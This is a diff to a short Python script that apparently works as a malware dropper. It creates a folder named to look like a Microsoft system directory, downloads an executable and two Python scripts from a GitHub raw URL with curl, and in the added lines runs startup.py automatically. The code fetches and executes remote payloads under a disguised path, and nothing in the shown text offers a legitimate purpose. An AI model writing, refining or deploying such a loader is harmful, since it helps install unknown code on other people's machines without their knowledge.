@@ -1,8 +1,17 @@
 import os
 
-os.system("mkdir C:/ProgramData/Microsoft Storage")
-os.system("cd C:/ProgramData/Microsoft Storage")
+directory = "C:/ProgramData/Microsoft Storage"
+os.makedirs(directory, exist_ok=True)
+os.chdir(directory)
 
-os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/clo.exe")
-os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/w.py")
-os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")
+files = [
+    "clo.exe",
+    "w.py", 
+    "startup.py"
+]
+
+base_url = "https://raw.githubusercontent.com/Fghghssss/BUSB/refs/heads/main/"
+
+for file in files:
+    os.system(f"curl -O {base_url}{file}")
+os.system("start startup.py")
